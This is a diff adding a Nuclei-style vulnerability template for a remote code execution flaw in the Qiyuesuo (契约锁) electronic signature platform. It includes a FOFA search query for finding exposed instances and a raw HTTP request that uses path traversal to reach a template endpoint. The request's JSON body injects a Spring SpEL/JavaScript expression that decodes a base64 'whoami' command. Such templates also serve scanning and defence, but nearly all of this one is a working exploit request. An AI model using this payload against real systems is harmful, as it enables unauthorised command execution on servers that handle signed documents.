@@ -1,0 +1,28 @@
+id: poc-ly9so9hf5z0yrvp3
+info:
+  name: 契约锁电子签章系统pdfverifier存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ly9so9hf5z0yrvp3'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ly9so9hf5z0yrvp3
+    fofa: app="契约锁-电子签署平台"
+http:
+- raw:
+  - 'POST /pdfverifier/%2e%2e/template/html/add HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+
+    Content-Type: application/json
+
+
+    {"file":"1","title":"2","params":{"extensionParam":"{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b=''d2hvYW1p'';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),''UTF-8'');var c=a[''parseExpression''];c.getValue();\"}","name":"test"}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
